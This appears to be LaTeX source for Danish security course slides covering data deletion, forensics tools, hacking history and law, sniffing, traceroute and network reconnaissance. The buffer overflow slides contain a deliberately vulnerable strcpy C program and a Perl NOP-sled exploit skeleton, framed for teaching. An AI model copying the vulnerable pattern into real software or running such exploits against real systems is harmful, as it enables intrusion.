\slide{Kryptering step 5 - getting rid of data}

\centerline{Husk: hvis du bruger kryptering fra starten er det nemmere at slette data - slet nøglen}

\slide{Definition}

\vskip 4cm

\begin{quote}
{\hlkbig
Computer Forensics involves the preservation, identification,
extraction, documentation and interpretation of computer data.}

\vskip 1 cm

\emph{Computer Forensics: Incident Response Essentials}, Warren
G. Kruse II og Jay G. Heiser, Addison-Wesley, 2002  
\end{quote}



\slide{TASK og Autopsy}

\hlkimage{7cm}{images/sleuthkit.png}

\begin{list1}
\item Inspireret af TCT har Brian Carrier fra Atstake lavet flere
  værktøjer til forensics analyse
\item Det officielle hjem for TASK og autopsy er nu:
  \link{www.sleuthkit.org}
\item TASK kan betragtes som en erstatning for TCT the coroners
  toolkit lavet af Dan Farmer og Wietse Venema
\item Autopsy er en Forensic Browser - et interface til TASK
\end{list1}

%Kilde: \link{http://www.atstake.com/research/tools/forensic/}
\slide{Hvordan slettes data}

\begin{list2}
\item Filsystemer skal være hurtige - skal ikke lave unødvendige
  operationer
\item En harddisk er en fysisk disk med en arm der skal bevæges og et
  læse/skrivehoved som skal tændes og slukkes
\item Hvis man kan undgå at skulle skrive over hele filen ved sletning
  er det hurtigere
\item De fleste operativsystemer sletter derfor kun metadata og
  overskriver derfor ikke alle datablokke for filer
\item Eksempel DOS FAT\\
Når man slettede en fil på MS-DOS fjernede man reelt kun det
  første bogstav i filnavnet\\
undelete bestod i at skrive det første bogstav i filnavnet - og
  håbe på at alle datablokke der hørte til filen stadig var at finde
  på disken 
\end{list2} 

\slide{Guttman paper - analyse af diske}

\begin{list1}
\item \emph{Secure Deletion of Data from Magnetic and Solid-State
    Memory} Peter Gutmann, 1996
\item Det er et klassisk paper om sletning af data som man bør læse\\ 
{\normalsize \link{http://www.cs.auckland.ac.nz/~pgut001/pubs/secure_del.html}}
%{http://www.cs.auckland.ac.nz/\~{}pgut001/pubs/secure\_del.html}
\item Der findes mange kommercielle værktøjer til sletning og en del
  Open Source - baseret på Guttman's dokument
\item DBAN er efter min mening et af de bedste\\
\link{http://dban.sourceforge.net/}
USB
\end{list1} 




\slide{Darik's Boot and Nuke}

\hlkimage{10cm}{images/dban-screenshot.png}

\begin{list2}
\item ad-hoc oprydning, formatering og sletning af filer giver ingen sikkerhed!
\item Free. Fast. Rapid deployment in emergency situations.
\item Easy. Start the computer with DBAN and press the ENTER key.
\item Safe. Irrecoverable data destruction. Prevents most forensic data recovery
 techniques.  
\item \link{http://dban.sourceforge.net/}
\item NB: Brug \link{http://unetbootin.sourceforge.net/} til at skrive CD-image til 
\end{list2}





\slide{Opsummering Del 1}



\slide{Be careful}

\hlkimage{6cm}{michael-conrad.jpg}
\centerline{\Large Hey, Lets be careful out there!}

\vskip 2cm
Kilde: Michael Conrad \link{http://www.hillstreetblues.tv/}

Nødvendigt eller er det ekstreme teknikker vi har diskuteret?


\slide{Del 2: Hacking, Hackerværktøjer, undersøg sikkerhed}

\hlkimage{10cm}{buffer-overflow-3.pdf}
\centerline{Teknisk hvad er hacking - og værktøjer}

Mere frit - vi undersøger nogle af emnerne fra del 1, som hackere

(Vi når IKKE alle opgaverne fra øvelseshæftet)



\slide{Målet for denne del}
\vskip 2 cm

\hlkimage{5cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}

\begin{list1}
\item Introduce hacking and a couple of hacker tools
\item List some tools that can be used to protect your computer and data
\item PS Sorry about the many TLAs ... og danglish
\end{list1}

præsentationen er meget teknisk, men foredraget behøver ikke at blive det \smiley

\slide{Introduktion til hacking}

\hlkimage{10cm}{hackers_JOLIE+1995.jpg}

\centerline{\link{http://www.imdb.com/title/tt0113243/} Hackers (1995)}

\slide{Internet today}


\hlkimage{14cm}{images/server-client.pdf}

\begin{list1}
\item Clients and servers
\item Rooted in academic networks
\item Protocols which are more than 20 years old, moved to TCP/IP in 1981
\item Trying to migrate to IPv6 - a lot of hacking opportunities here
\end{list1}

\slide{Internet - Here be dragons}

\vskip 2cm
\hlkimage{24cm}{dragon-drawing-6.jpg}

\slide{Matrix style hacking anno 2003}

\hlkimage{17cm}{trinity-hacking-hd-cropscale-302x250.jpg}

\slide{Trinity breaking in}

\hlkimage{20cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
\link{http://nmap.org/movies.html}\\
Meget realistisk \link{http://www.youtube.com/watch?v=51lGCTgqE_w}


\slide{Hacker - cracker}

{\bfseries Det korte svar - drop diskussionen}

%Det lidt længere svar:\\
Det havde oprindeligt en anden betydning, men medierne har taget
udtrykket til sig - og idag har det begge betydninger. 

{\color{red}\hlkbig Idag er en hacker stadig en der bryder ind i systemer!}

ref. Spafford, Cheswick, Garfinkel, Stoll, ...
- alle kendte navne indenfor sikkerhed


\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll  
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz 
\end{list2}

\slide{Definition af hacking, oprindeligt}

\begin{quote}
Eric Raymond, der vedligeholder en ordbog over computer-slang (The Jargon File) har blandt andet følgende forklaringer på ordet hacker:
\begin{list2}
\item En person, der nyder at undersøge detaljer i programmerbare systemer og hvordan man udvider deres anvendelsesmuligheder i modsætning til de fleste brugere, der bare lærer det mest nødvendige
\item En som programmerer lidenskabligt (eller enddog fanatisk) eller en der foretrækker at programmere fremfor at teoretiserer om det
\item En ekspert i et bestemt program eller en der ofter arbejder med eller på det; som i "en Unixhacker".
\end{list2}
\end{quote}

\begin{list1}
\item Kilde: Peter Makholm, \link{http://hacking.dk}
\item Benyttes stadig i visse sammenhænge se \link{http://labitat.dk}
\end{list1}

\slide{Internet er åbne standarder!}

{\hlkbig 
We reject kings, presidents, and voting.\\
We believe in rough consensus and running code.\\
-- The IETF credo Dave Clark, 1992.}

\begin{list1}
\item Request for comments - RFC - er en serie af dokumenter
\item RFC, BCP, FYI, informational\\
de første stammer tilbage fra 1969
\item Ændres ikke, men får status Obsoleted når der udkommer en nyere
  version af en standard
\item Standards track:\\
Proposed Standard $\rightarrow$ Draft Standard $\rightarrow$ Standard
\item  Åbne standarder = åbenhed, ikke garanti for sikkerhed
\end{list1}

\slide{The Internet Worm 2. nov 1988}

\begin{list1}
\item Udnyttede følgende sårbarheder
\begin{list2}
\item buffer overflow i fingerd - VAX kode
\item  Sendmail - DEBUG
\item Tillid mellem systemer: rsh, rexec, ...
\item dårlige passwords
\end{list2}
\item Avanceret + camouflage!
\begin{list2}
\item Programnavnet sat til 'sh'
\item Brugte fork() til at skifte PID jævnligt
\item password cracking med intern liste med 432 ord og /usr/dict/words
\item Fandt systemer i /etc/hosts.equiv, .rhosts, .forward, netstat ...
\end{list2}
\item Lavet af Robert T. Morris, Jr. 
\item Medførte dannelsen af CERT, \link{http://www.cert.org}
\end{list1}





\slide{Hackerværktøjer}
% måske til reference afsnit?

\begin{list1}
\item Der benyttes en del værktøjer:
\begin{list2}
\item nmap - \link{http://www.insecure.org} portscanner
%\item Nessus - \link{http://www.nessus.org} automatiseret testværktøj
%\item libnet m.fl. - \link{http://www.packetfactory.net} - diverse projekter
%  relateret til pakker og IP netværk
%\item l0phtcrack - \link{http://www.atstake.com/research/lc/} - The Password
%  Auditing and Recovery Application
\item Wireshark - \link{http://http://www.wireshark.org/} avanceret netværkssniffer
%\item F.I.R.E -  \link{http://biatchux.dmzs.com/} - en cd-rom der indeholder en 
%  bootable Linux del.
\item OpenBSD - \link{http://www.openbsd.org} operativsystem med fokus
  på sikkerhed 
%\item \link{http://www.isecom.org/} - Open Source Security Testing
%  Methodology Manual - gennemgang af elementer der bør indgå i en struktureret test 
\item BackTrack \link{http://www.remote-exploit.org/backtrack.html}
\item Putty - 
\link{http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html}\\
terminal emulator med indbygget SSH
\end{list2}

\end{list1}

\vskip 2cm
\centerline{Er det fornuftigt at man kan hente dem?}

\slide{Aftale om test af netværk}

{\bfseries Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel
  indtil 6 måneder 
straffes den, som uberettiget skaffer sig adgang til en andens
oplysninger eller programmer, der er bestemt til at bruges i et anlæg
til elektronisk databehandling.}

Hacking kan betyde:
\begin{list2}
\item At man skal betale erstatning til personer eller virksomheder
\item At man får konfiskeret sit udstyr af politiet
\item At man, hvis man er over 15 år og bliver dømt for hacking, kan
  få en bøde - eller fængselsstraf i alvorlige tilfælde 
\item At man, hvis man er over 15 år og bliver dømt for hacking, får
en plettet straffeattest. Det kan give problemer, hvis man skal finde
et job eller hvis man skal rejse til visse lande, fx USA og
Australien
\item Frit efter: \link{http://www.stophacking.dk} lavet af Det
  Kriminalpræventive Råd 
\item Frygten for terror har forstærket ovenstående - så lad være!
\end{list2}



% Hvor bærer udviklingen hen

\slide{DDoS udviklingen, januar 2010 rapporten}

\hlkimage{15cm}{DDoS-2010.png}

Kilde:
\link{http://www.arbornetworks.com/report} 2009 rapporten



\slide{DDoS udviklingen, februar 2011}

\hlkimage{15cm}{ddos-2010-arbornetworks.png}

Kilde:
\link{http://www.arbornetworks.com/report} 2010 rapporten


\slide{Key findings}

\begin{list2}
\item Application-Layer DDoS Attacks Are Increasing in Sophistication and Operational Impact
\item Mobile/Fixed Wireless Operators Are Facing Serious Challenges to Maintaining Availability in the Face of Attacks
\item Firewalls and IPS Devices Are Falling Short on DDoS Protection
\item DNS Has Broadly Emerged as an Attack Target and Enabler
\item Lack of Visibility into and Control over IPv6 Traffic Is a Significant Challenge
\item Chronic Underfunding of Operational Security Teams
\item Operators Continue to Express Low Confidence in the Efficacy of Law Enforcement
\item Operators Have Little Confidence in Government Efforts to Protect Critical Infrastructure
\end{list2}

Kilde:
\link{http://www.arbornetworks.com/report} februar 2011

\slide{Hacking rammer alle}

\begin{list1}
\item Der er mange pointer at lære fra de mange hacking historier
\item Social Engineering rockz! Uddannelse!
\item Alle er et mål, evt. som springbrædt ind til andre
\item Anonymous er en flok forkælede møgunger? helte? egoer? løst knyttet gruppe, tæt knyttet gruppe?
\item Hacktivism er okay, bare det rammer Scientology?
\item ... flere pointer?
\end{list1}

\vskip 2cm
\centerline{\bf Hacking er ikke cool og koster mange resourcer!}

\slide{Hacking er magi}

\hlkimage{7cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking ligner indimellem  magi}


\slide{Hacking er ikke magi}

\hlkimage{17cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking kræver blot lidt ninja-træning}





\slide{Hacking eksempel - det er ikke magi}

\begin{list1}
\item MAC filtrering på trådløse netværk
\item Alle netkort har en MAC adresse - BRÆNDT ind i kortet fra fabrikken
\item Mange trådløse Access Points kan filtrere MAC adresser
\item Kun kort som er på listen over godkendte adresser tillades adgang til netværket
\pause
\item Det virker dog ikke \smiley
\item De fleste netkort tillader at man overskriver denne adresse midlertidigt
%\item Derudover har der ofte været fejl i implementeringen af MAC filtrering
\end{list1}

\slide{Myten om MAC filtrering}

\begin{list1}
\item Eksemplet med MAC filtrering er en af de mange myter 
\item Hvorfor sker det?
\item Marketing - producenterne sætter store mærkater på æskerne
\item Manglende indsigt - forbrugerne kender reelt ikke koncepterne
\item Hvad \emph{er} en MAC adresse egentlig
\item Relativt få har forudsætningerne for at gennemskue dårlig sikkerhed
\item Løsninger?
\pause
\item Udbrede viden om usikre metoder til at sikre data og computere
\item Udbrede viden om sikre metoder til at sikre data og computere
\end{list1}

\slide{MAC filtrering}

\hlkimage{15cm}{stupid-security.jpg}





\slide{Teknisk hvad er hacking}

\hlkimage{17cm}{buffer-overflow-3.pdf}

\slide{buffer overflows et C problem}

\begin{list1}
\item {\bfseries Et buffer overflow}
er det der sker når man skriver flere data end der er afsat plads til
i en buffer, et dataområde. Typisk vil programmet gå ned, men i visse
tilfælde kan en angriber overskrive returadresser for funktionskald og
overtage kontrollen. 
\item {\bfseries Stack protection} 
er et udtryk for de systemer der ved hjælp af operativsystemer,
programbiblioteker og lign. beskytter stakken med returadresser og
andre variable mod overskrivning gennem buffer overflows. StackGuard
og Propolice er nogle af de mest kendte.
\end{list1}

\slide{Buffer og stacks}

\hlkimage{20cm}{buffer-overflow-1.pdf}

\begin{alltt}
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]); 
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}


\slide{Overflow - segmentation fault }

\hlkimage{20cm}{buffer-overflow-2.pdf}


\begin{list1}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list1}


\slide{Exploits}

\vskip 1 cm

\begin{alltt}
$buffer = ""; 
$null = "\textbackslash{}x00"; \pause
$nop = "\textbackslash{}x90"; 
$nopsize = 1; \pause
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0xdeadbeef; // address where shellcode is 
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}\pause
$address = pack('l', $the_shell_pointer);
$buffer .= $address;\pause
exec "$program", "$buffer";
\end{alltt}
\vskip 1 cm
\centerline{Demo exploit in Perl}

\slide{Hvordan finder man buffer overflow, og andre fejl}

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source betyder man kan læse og analysere koden 
\item Source code review - automatisk eller manuelt
\item Fejl kan findes ved at prøve sig frem - fuzzing
\item Exploits virker typisk mod specifikke versioner af software
\end{list1}

\slide{The Exploit Database - dagens buffer overflow}

\hlkimage{20cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}

\slide{Metasploit}

\hlkimage{20cm}{metasploit-about.png}

\begin{list1}
\item Idag findes der samlinger af exploits som milw0rm
\item Udviklingsværktøjerne til exploits er idag meget raffinerede!
\item \link{http://www.metasploit.com/}
\item \link{http://www.fastandeasyhacking.com/} Armitage GUI til Metasploit
\item \link{http://www.offensive-security.com/metasploit-unleashed/}
\end{list1}


\slide{Forudsætninger}

\begin{list1}
\item Bemærk: alle angreb har forudsætninger for at virke
\item Et angreb mod Telnet virker kun hvis du bruger Telnet
\item Et angreb mod Apache HTTPD virker ikke mod Microsoft IIS
\item Kan du bryde kæden af forudsætninger har du vundet!
\end{list1}

\slide{Eksempler på forudsætninger}


\begin{list1}
\item Computeren skal være tændt
\item Funktionen der misbruges skal være slået til
\item Executable stack
\item Executable heap
\item Fejl i programmet
\end{list1}
\pause
\vskip 2cm 

\centerline{\color{titlecolor}\LARGE \bf alle programmer har fejl}

\slide{Normal wireless brug}

\hlkimage{22cm}{images/wlan-airpwn-1.pdf}


\slide{BackTrack 5 og sniffer programmer}

\hlkimage{16cm}{bt5-revolution-blogpost-BTL.png}

\begin{list1}
\item Wireshark - \link{http://www.wireshark.org} avanceret netværkssniffer\\
bruger vi til at sniffe, vi bruger Wireshark til primære demo, nævner Ettercap osv.
\item BackTrack \link{http://www.backtrack-linux.org/}
\end{list1}

\slide{Wireshark - grafisk pakkesniffer}

\hlkimage{20cm}{images/wireshark-website.png} 

\centerline{\link{http://www.wireshark.org}}
\centerline{både til Windows og UNIX, tidligere kendt som Ethereal}

\slide{Programhygiejne!}

\begin{list1}
  \item {\color{red}Download, installer - kør!} - farligt!
\item Sådan gøres det:
  \begin{list2}
    \item download program OG signaturfil/MD5
\item verificer signatur eller MD5
\item installer
\item brug programmet
\item hold programmet opdateret!

\end{list2}
\end{list1}

\slide{Scenarier for BackTrack}

\begin{list1}
\item Det anbefales at afvikle BackTrack i en virtuel maskine, på klient med VMware Player, Virtualbox eller tilsvarende
\item BackTrack kan også benyttes som pentest server i netværket, med eller uden virtualisering
\item BackTrack \link{http://www.backtrack-linux.org/}\\
\end{list1}


\slide{Chaosreader}

\hlkimage{10cm}{chaosreader1.jpg}
\hlkimage{20cm}{chaosreader2.png}
\begin{list1}
\item Med adgang til et netværksdump kan man læse det med chaosreader
\item Output er HTML med oversigter over sessioner, billeder fra datastrømmen osv.
\item \link{http://chaosreader.sourceforge.net/}

\end{list1}


\slide{Opbevaring af passwords}

\hlkimage{10cm}{password-window.png}

\slide{Cain og Abel}

%\hlkimage{10cm}{cain_brute_attack.jpg}
\hlkimage{20cm}{cain-win.png}

\begin{list1}
\item  Cain og Abel anbefales ofte istedet for l0phtcrack
  \link{http://www.oxid.it}
\end{list1}


\slide{John the ripper}

\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords. Besides several crypt(3)
password hash types most commonly found on various Unix flavors,
supported out of the box are Kerberos AFS and Windows NT/2000/XP/2003
LM hashes, plus several more with contributed patches.   
\end{quote}

\begin{list1}
\item UNIX passwords kan knækkes med alec Muffets kendte Crack program
  eller eksempelvis John The Ripper \link{http://www.openwall.com/john/}  
\item Jeg bruger selv John The Ripper
\end{list1}

% forbedre sikkerhed
\slide{What to do?}

\hlkimage{16cm}{homer-end-is-near}
\vskip 1 cm
\centerline{What do we do?}

\slide{Damn Vulnerable Linux boot CD'er}

\hlkimage{15cm}{dvl-exploitme.png}

\begin{list1}
\item Damn Vulnerable Linux \link{http://www.damnvulnerablelinux.org/}\\
DVL er baseret på Linux og må kopieres frit :-)
\item Brug DVD'en eller VMware player til den
\end{list1}

\slide{UNIX starthjælp}
\begin{list1}
\item Da UNIX indgår er her et lille \emph{cheat sheet} til UNIX
\begin{list2}
\item DOS/Windows kommando - tilsvarende UNIX, og forklaring
\item dir - ls - står for list files, viser filnavne
\item del - rm - står for remove, sletter filer
%\item ren - mv - move flytter filer til nyt navn, rename
%\item md - mkdir - make directory, lav en mappe/katalog
\item cd - cd - change directory, skifter katalog
\item type - cat - concatenate, viser indholdet af tekstfiler 
\item more - less - viser tekstfiler en side af gangen
\item attrib - chmod - change mode, ændrer rettighederne på filer 
\end{list2}
\item Prøv bare:
  \begin{list2}
    \item {\bfseries ls} list, eller long listing med {\bfseries ls -l} 
    \item {\bfseries cat /etc/hosts} viser hosts filen 
\item {\bfseries chmod +x head.sh} - sæt execute bit på en fil så den
  kan udføres som et program med kommandoen \verb+./head.sh+
  \end{list2}
\end{list1}

\slide{OWASP WebGoat}

\hlkimage{14cm}{WebGoat.png}

\begin{list1}
\item WebGoat fra OWASP, \link{http://www.owasp.org}
\item Træningsmiljø til webhacking
\item Downloades som Zipfil og kan afvikles direkte på en Windows laptop
\end{list1}


\slide{Hvad skal der ske?}

\begin{list1}
\item Tænk som en hacker
\item Rekognoscering
\begin{list2}
\item ping sweep, port scan
\item OS detection - TCP/IP eller banner grab
\item Servicescan - rpcinfo, netbios, ...
\item telnet/netcat interaktion med services
\end{list2}
\item Udnyttelse/afprøvning: OpenVAS, nikto, exploit programs
\item Oprydning vises ikke på kurset, men I bør i praksis:
\begin{list2}
\item Lav en rapport
\item Gennemgå rapporten, registrer ændringer
\item Opdater programmer, konfigurationer, arkitektur, osv. 
\end{list2}
\item I skal jo også VISE andre at I gør noget ved sikkerheden.
\end{list1}


%\slide{Hackere}

% Her skal KSA præsentation ind

% session 1-2 netværk start her


% xxx \slide{RFC, Internet, åbne standarder}

% input fra tidligere præsentationer 5-10 slides




\slide{OSI og Internet modellerne}

\hlkimage{14cm,angle=90}{images/compare-osi-ip.pdf}


\slide{Wireshark - grafisk pakkesniffer}

\hlkimage{20cm}{images/wireshark-website.png} 

\centerline{\link{http://www.wireshark.org}}
\centerline{både til Windows og UNIX, tidligere kendt som Ethereal}

\slide{Brug af Wireshark}

\hlkimage{13cm}{images/ethereal-capture-options.png}

\centerline{Man starter med Capture - Options}

\slide{Brug af Wireshark}

\hlkimage{24cm}{images/ethereal-main-window.png}

\centerline{Læg mærke til filtermulighederne}


\slide{dsniff}

\begin{list1}
\item en sniffer til mange usikre protokoller
\item inkluderer {\bfseries arpspoof}  
\item Lavet af Dug Song, dugsong@monkey.org
\end{list1}

\begin{alltt}
dsniff  is  a  password sniffer which handles FTP, Telnet,
SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP,  Rlogin,
RIP,  OSPF,  PPTP  MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11,
CVS, IRC, AIM, ICQ, Napster,  PostgreSQL,  Meeting  Maker,
Citrix  ICA,  Symantec  pcAnywhere, NAI Sniffer, Microsoft
SMB, Oracle SQL*Net, Sybase and Microsoft SQL protocols.
\end{alltt}

\slide{dsniff forudsætninger}

\begin{list1}
\item Der er visse forudsætninger der skal være opfyldt
  \begin{list2}
\item Man skal have trafikken
\item Det kan gøres gennem arp spoofing eller ved at hacke ind i et
  system/router på netværksvejen
\end{list2}
\end{list1}

\begin{center}
  \colorbox{white}{\includegraphics[width=12cm]{images/arp-spoof.pdf}}  
\end{center}

\slide{Kommenteret dsniff}

\hlkimage{22cm}{images/dsniff-comments.pdf}


\slide{netværksdesign og sikkerhed}

\begin{list1}
  \item Hvad kan man gøre for at få bedre netværkssikkerhed?
    \begin{list2}
    \item bruge switche - der skal ARP spoofes og bedre performance
    \item opdele med firewall til flere DMZ zoner for at holde
      udsatte servere adskilt fra hinanden, det interne netværk og
      Internet
    \item overvåge, læse logs og reagere på hændelser 
    \end{list2}
\end{list1}


\slide{Chaosreader}

\hlkimage{10cm}{chaosreader1.jpg}
\hlkimage{20cm}{chaosreader2.png}
\begin{list1}
\item Med adgang til et netværksdump kan man læse det med chaosreader
\item Output er HTML med oversigter over sessioner, billeder fra datastrømmen osv.
\item \link{http://chaosreader.sourceforge.net/}

\end{list1}


\slide{Secure Shell - SSH og SCP}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/tshirt-9b.jpg}}  
\end{center}
\begin{list1}
\item SSH afløser en række protokoller som er usikre:
  \begin{list2}
  \item Telnet til terminal adgang
  \item r* programmerne, rsh, rcp, rlogin, ...
  \item FTP med brugerid/password
  \end{list2}
\end{list1}


\slide{SSH - de nye kommandoer er}
\begin{list1}
\item kommandoerne er:
\begin{list2}
  \item ssh - Secure Shell
  \item scp - Secure Copy
  \item sftp - secure FTP 
  \end{list2}
\item Husk: SSH er både navnet på protokollerne - version 1 og 2 samt
  programmet \verb+ssh+ til at logge ind på andre systemer
\item SSH tillader også port-forward, tunnel til usikre protokoller,
  eksempelvis X protokollen til UNIX grafiske vinduer
\item {\bfseries NB: Man bør idag bruge SSH protokol version 2!}
\end{list1}


\slide{Putty en SSH til Windows}

\begin{center}
\colorbox{white}{\includegraphics[width=13cm]{images/putty-1.jpg}}  

Login skærmen til Putty terminal programmet
\end{center}

\slide{Putty terminaladgang}

\begin{center}
\colorbox{white}{\includegraphics[width=20cm]{images/putty-screen2.jpg}}  

Billede fra \link{http://edu.muhos.fi/opas/ssh/putty-ohje.htm}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=16cm]{images/winscp-login-advanced.png}}  
\end{center}

\begin{center}
\item screenshot fra \link{http://winscp.vse.cz/eng/screenshots/large/advanced.gif}
\end{center}

\slide{Grafisk Secure Copy - WinSCP}

\begin{center}
\colorbox{white}{\includegraphics[width=12cm]{images/winscp-explorer.png}}  
\end{center}

\begin{center}
\item screenshot fra
  \link{http://winscp.vse.cz/eng/screenshots/large/explorer.gif} 
\end{center}


\exercise{ex:putty-install}

\exercise{ex:winscp-install}



\exercise{ex:unix-login}

\exercise{ex:unix-cal}

\exercise{ex:sudo}

\exercise{ex:unix-boot-cd}

\exercise{ex:wireshark}

\exercise{ex:wireshark-sniff}

\slide{traceroute}

\begin{list1}
  \item traceroute programmet virker ved hjælp af TTL
\item levetiden for en pakke tælles ned i hver router på vejen og ved at sætte denne lavt
  opnår man at pakken \emph{timer ud} - besked fra hver router på vejen
\item default er UDP pakker på Unix
\item default er ICMP pakker på Windows, tracert kommandoen
\item BackTrack giver mulighed for at bruge UDP, TCP, ICMP
\end{list1}


\slide{traceroute - med UDP}

\begin{alltt}
\small # {\bfseries tcpdump -i en0 host 217.157.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 [ttl 1]
23:23:30.426742 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 [ttl 1]
23:23:30.436357 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 [ttl 1]
23:23:30.437383 safri > 10.0.0.200: icmp: time exceeded in-transit
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router udp port 33438 unreachable
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router udp port 33439 unreachable
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router udp port 33440 unreachable
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR? \\
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}

\slide{Værdien af traceroute}

\begin{list1}
\item diagnosticering af netværksproblemer - formålet med traceroute
\item indblik i netværkets opbygning!
\item svar fra hosts - en modtaget pakke fremfor et \emph{sort hul}

\item traceroute er ikke et angreb - det er også vigtigt at kunne
  genkende normal trafik!
\end{list1}

\slide{Network mapping}

\hlkimage{23cm}{images/network-example.pdf}

\begin{list1}
\item Ved brug af traceroute og tilsvarende programmer kan man ofte
  udlede topologien i det netværk man undersøger  
\end{list1}


\slide{Andre trace programmer}

\begin{list1}
  \item Der findes mange specialiserede trace programmer til diverse
  formål
\item Eksempel: dnstracer information om DNS servere
\end{list1}

\begin{alltt}
# dnstracer -r . www.security6.net
Strange amount of retries, setting to default
Tracing to www.security6.net via 10.0.0.11, timeout 15 seconds
10.0.0.11 (10.0.0.11) 
 |\___ H.GTLD-SERVERS.net [net] (192.54.112.30) 
 |     |\___ NS6.GANDI.net [security6.net] (80.67.173.196) * * * 
 |      \___ NS1.security6.net [security6.net] (217.157.20.130) 
 |           |\___ B.GTLD-SERVERS.net [net] (192.33.14.30) 
 |           |     |\___ NS6.GANDI.net [security6.net] ...
\end{alltt}

\slide{Flere traceprogrammer}

\begin{list1}

\item mtr My traceroute - grafisk \link{http://www.bitwizard.nl/mtr/}
\item lft - \emph{layer four trace} benytter TCP SYN og FIN prober
\item trace ved hjælp af TCP og andre protokoller findes
\item paratrace - \emph{Parasitic Traceroute via Established TCP Flows
    and IPID Hopcount} 
\item Der findes webservices hvor man kan trace fra, eksempelvis:\\ \link{http://www.traceroute.org}
\end{list1}

\slide{What time is it?}

\hlkimage{8cm}{images/xclock.pdf}

\begin{center}
\hlkbig Hvad er klokken?

\vskip 1 cm
Hvad betydning har det for sikkerheden?

Brug NTP Network Time Protocol på produktionssystemer
\end{center}

\slide{What time is it? - spørg ICMP}

\vskip 1 cm

\begin{list1}
  \item ICMP timestamp option - request/reply
\item hvad er klokken på en server
\item Slayer icmpush - er installeret på server
\item viser tidstempel
\end{list1}

\begin{alltt}
# {\bfseries icmpush -v -tstamp 10.0.0.12}
ICMP Timestamp Request packet sent to 10.0.0.12 (10.0.0.12)

Receiving ICMP replies ...
fischer         -> 21:27:17
icmpush: Program finished OK
\end{alltt}

\exercise{ex:ping}
\exercise{ex:icmpush}


% session 1-4

\slide{Informationsindsamling}

\begin{list1}
\item Det vi har udført er informationsindsamling
\item Indsamlingen kan være aktiv eller passiv indsamling i forhold
  til målet for angrebet
\item passiv kunne være at lytte med på trafik eller søge i databaser
  på Internet
\item aktiv indsamling er eksempelvis at sende ICMP pakker og
  registrere hvad man får af svar
\end{list1}

\slide{MAC adresser}
%\hlkimage{10cm}{apple-oui.png}

\begin{alltt}
00-03-93   (hex)        Apple Computer, Inc.
000393     (base 16)    Apple Computer, Inc.
                        20650 Valley Green Dr.
                        Cupertino CA 95014
                        UNITED STATES
\end{alltt}
\begin{list1}
\item Netværksteknologierne benytter adresser på lag 2
\item Typisk svarende til 48-bit MAC adresser som kendes fra Ethernet MAC-48/EUI-48
\item Første halvdel af adresserne er Organizationally Unique Identifier (OUI)
\item Ved hjælp af OUI kan man udlede hvilken producent der har produceret netkortet
\item \link{http://standards.ieee.org/regauth/oui/index.shtml}
\end{list1}

\slide{IPv4 pakken - header - RFC-791}

\begin{alltt}
\small  
    0                   1                   2                   3   
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
